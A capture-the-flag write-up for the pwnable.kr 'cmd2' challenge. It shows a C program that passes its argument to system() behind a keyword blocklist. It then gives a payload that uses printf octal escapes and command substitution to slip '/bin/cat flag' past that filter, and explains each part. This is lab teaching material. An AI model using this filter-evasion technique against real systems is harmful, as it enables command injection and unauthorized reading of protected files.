## pwn : cmd2 [writeup]

Challenge from [pwnable.kr](https://pwnable.kr/)

**In this challenge** We have this code :

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}
```

### READ MORE IN `cmd1` SOLUTION [HERE](https://github.com/amineichou/pwn/tree/main/cmd1)

### Solution
```bash
./cmd2 '$(printf "%bbin%bcat %s%s" "\57" "\57" "fla" "g")'
```

### Explanation

- `%b` tells printf to interpret escape sequences.
- `%s` is for inserting a string.

1. Each part of the command translates like this:

- `"\57"`: In octal, 57 is '/', so \57 translates to '/'.
- `"bin"`: Literal text.
- `"\57"` (again): Another '/'.
- `"cat"`: Literal text.
- `"fla"` and `"g"`: When combined, they form "flag".

Putting these together, printf will produce the following output:

```bash
/bin/cat flag
```

2. Command Substitution with $( ... ):

The $( ... ) syntax is command substitution in Bash, which runs the command inside and substitutes it with the output. So:

```bash
$(printf "%bbin%bcat %s%s" "\57" "\57" "fla" "g")
```

will replace itself with `/bin/cat flag`.

3. Running ./cmd2:

Finally, the entire command:

```bash
./cmd2 '$(printf "%bbin%bcat %s%s" "\57" "\57" "fla" "g")'
```

effectively becomes:

```bash
./cmd2 '/bin/cat flag'
```

end.